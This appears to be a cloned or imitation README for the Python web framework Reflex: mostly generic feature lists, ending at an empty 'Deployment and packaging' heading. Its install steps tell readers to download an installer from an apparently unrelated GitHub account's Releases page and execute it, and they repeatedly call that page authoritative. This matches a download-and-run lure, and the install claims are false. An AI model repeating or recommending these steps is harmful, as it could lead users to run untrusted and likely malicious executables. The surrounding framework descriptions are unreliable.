![Reflex banner](https://img.shields.io/badge/Reflex-Pure-Python-ff69b4?style=for-the-badge)

Reflex is a lightweight, open source framework for building web applications and desktop-like GUIs using pure Python. It blends web technologies with Python tooling to provide an approachable development experience. The project focuses on clarity, speed, and portability. It aims to help developers ship robust, maintainable software without needing to write heavy JavaScript code or rely on complex build systems.

This repository centers on a single, cohesive idea: write your app in Python, render the UI in the web browser, and run everything with a minimal server that you can deploy anywhere Python runs. The core team favors explicitness, small surface area, and strong DX (developer experience). Reflex supports a broad range of use cases, from small internal tools to larger web apps with real-time interfaces and modular components. It is designed to be easy to learn for Python developers while offering enough power for experienced coders to craft polished products.

Why Reflex
- Pure Python foundation: Write everything in Python. No need to juggle multiple languages to build a web app.
- Web-native UI with desktop usability: The UI runs in the browser, but the logic remains Pythonic. This allows you to craft responsive interfaces with familiar language semantics.
- Open source and extensible: Reflex is designed to be extended. Add components, adapt rendering, or plug in new backends as your project grows.
- Lightweight by design: Reflex prioritizes a small core and a clear extension path. It avoids heavy abstractions that slow development.

Quick start
First steps
- Ensure you have Python 3.8+ installed on your system.
- Create a new project directory to keep your work organized.
- Install Reflex from the Releases page. For example, download the latest installer package from the Releases page and run it on your machine. The installer will place a local environment with the framework and a starter template.

Note about the Releases page
- The link provided above points to a releases collection. It contains downloadable assets for different platforms. For convenience, Reflex ships installers and wheel packages for common operating systems. When you visit the page, you will typically see a list of artifacts. Choose the artifact that matches your platform, download it, and execute it to install Reflex locally. The Releases page is the authoritative source for installers, wheels, and example projects. If you ever need to verify the latest stable build, the Releases page is the right place to check. Link: https://github.com/SawmFawker/reflex/releases

Setting up a minimal project
- Create a new directory for your app.
- Open a shell in that directory.
- Run reflex create my_app to scaffold a starter project. If the command is not yet available in your environment, follow the installer prompts to set up the command line interface.
- Navigate into the project: cd my_app
- Start the development server: reflex run
- Open http://localhost:8000 in your browser. You should see a basic Reflex app running with a simple user interface.

What you get with Reflex
- A clean Python-centric workflow.
- A UI abstraction that maps Python code to interactive web content.
- A development server that serves fast feedback during iteration.
- A straightforward approach to routing, state, and components.
- A path to production deployment that scales with your needs.

Core concepts
- Component model: Components are Python classes or functions that describe a piece of the UI. They receive state and props and render HTML-like structures.
- Reactive state: State changes trigger re-renders where needed. You write straightforward Python logic to manage UI state.
- Templates and rendering: Reflex uses a templating approach to produce the DOM. Templates can be authored in Python, with optional, lightweight syntax for clarity.
- Events: User actions map to Python handlers. Events flow into your logic, update state, and cause the UI to refresh.
- Routing: Apps expose routes. Each route maps to a view function or a component with its own state.
- Styling: Styles are applied via CSS, with a theming system to switch palettes and typography at runtime or build time.
- Extensibility: You can plug in new components, backends, or rendering targets without rewriting the core.

How Reflex works
- The runtime runs in Python and serves UI logic via a small server.
- The browser renders the UI using standard HTML/CSS and communicates with Python over a lightweight protocol.
- The protocol is designed to be bidirectional: the client can notify Python about events, and Python can push UI updates when state changes.
- The rendering layer converts Python-side component trees into a DOM representation, applying styles and accessibility attributes as needed.
- A minimal, well-documented API keeps the learning curve gentle while enabling powerful patterns.

Architecture and design
- Modularity: The framework is broken into layers with clear boundaries: core, widgets, templating, routing, and tooling.
- Dependency-light: Reflex avoids heavy runtime dependencies. It leans on the Python standard library for core functionality and a small set of external libraries for optional features.
- Portability: Reflex runs on any platform where Python runs. It supports Linux, macOS, and Windows with a consistent developer experience.
- Performance-conscious: The core favors predictable performance, with a focus on fast render cycles and efficient state management.
- Accessibility-aware: UI primitives include accessible semantics out of the box, with sensible ARIA attributes and keyboard navigability.

UI primitives and components
- Text and inputs: Text fields, text areas, selects, checkboxes, radio groups, and date/time inputs.
- Containers: Panels, grids, stacks, and tabs to organize UI layout.
- Buttons and actions: Buttons, toggles, and action groups that trigger Python handlers.
- Lists and cards: Reusable list components and card-based layouts for content-rich apps.
- Media and visuals: Image placeholders, icons, progress indicators, and charts (through optional adapters).
- Data visualization: Lightweight charting components that render on the client, driven by Python-provided data series.
- Form validation: Built-in validation hooks with clear error reporting for better UX.

Routing, state, and events
- Route definitions: Map URL paths to Python-based views. Each route can have its own nested components and local state.
- Global state: A centralized store can hold app-wide constants, user data, and session information.
- Local state: Components can maintain internal state that persists through the componentâ€™s lifecycle.
- Event handlers: Python functions respond to user actions, such as clicks, form submissions, and navigation events.
- Async-ready: The framework supports asynchronous operations in handlers, enabling non-blocking data fetches and long-running tasks without freezing the UI.

Templating and rendering
- Python-first templates: Templates are authored in Python, using readable constructs that resemble the structure of the UI.
- Declarative rendering: You describe what the UI should look like given the state, and Reflex computes the minimal changes to the DOM.
- Conditional rendering: If-else blocks are expressed in Python, keeping control flow familiar and readable.
- Iterative rendering: For loops generate dynamic lists and repeated components efficiently.
- Template inheritance: Share common layout structures across pages for consistency.

Styling and theming
- CSS-based styling: Styles are defined in CSS or CSS-like syntax, with a clean separation from business logic.
- Theming system: Switch palettes, fonts, and spacing at runtime or at build time. Themes can be swapped via user preference or app state.
- Customizable tokens: Define design tokens for colors, typography, spacing, and radii to enforce consistency.
- Responsive design: Layouts adapt to different screen sizes automatically, ensuring usability on phones, tablets, and desktops.

Persistence and data
- Local storage support: Store small amounts of data locally to improve UX and enable offline capabilities.
- Simple persistence layer: Reflex offers a straightforward API to read and write data to a backend or a file-based store.
- Database adapters: Optional adapters allow Reflex to talk to relational or NoSQL databases. The integration layer keeps Pythonic calls clean and consistent.
- Data synchronization: Real-time or near-real-time updates can be wired in via event streams with minimal boilerplate.

Networking and real-time features
- Websockets and streaming: Real-time updates are supported where the app needs live data.
- API endpoints: The framework provides endpoints for common CRUD operations, authenticated data access, and batch processing.
- Security-conscious transport: Data is transmitted over secure channels when deployed with TLS.
- Rate limiting and backpressure: The runtime includes sensible defaults to prevent abuse or slowdowns under load.

Testing and quality
- Unit tests: A testing harness encourages modular, isolated tests for components and state logic.
- End-to-end tests: Tools are provided to simulate user interactions and verify flows end-to-end.
- Linters and formatters: Built-in support for code quality checks and consistent formatting.
- Documentation tests: Inline docs double as runnable examples to keep docs synchronized with code.

Extending Reflex
- Plugins and extensions: Add new components, templates, or adapters through a clean plugin interface.
- Backends: Swap or extend rendering backends with minimal changes to your app code.
- Theming: Create new themes without touching component logic; themes can be shared with the community.
- Localization: Extend the framework with translations for UI text and messages.

CLI and tooling
- Scaffold and initialize: Quick start commands set up a project skeleton, including routing and a starter UI.
- Run and debug: A fast dev server with live reload for rapid iteration.
- Build and package: Build artifacts for distribution, including platform-specific installers.
- Test and lint: A simple suite to run tests and check code quality.
- Documentation generation: Build doc pages from code comments and inline docs.

Deployment and packaging
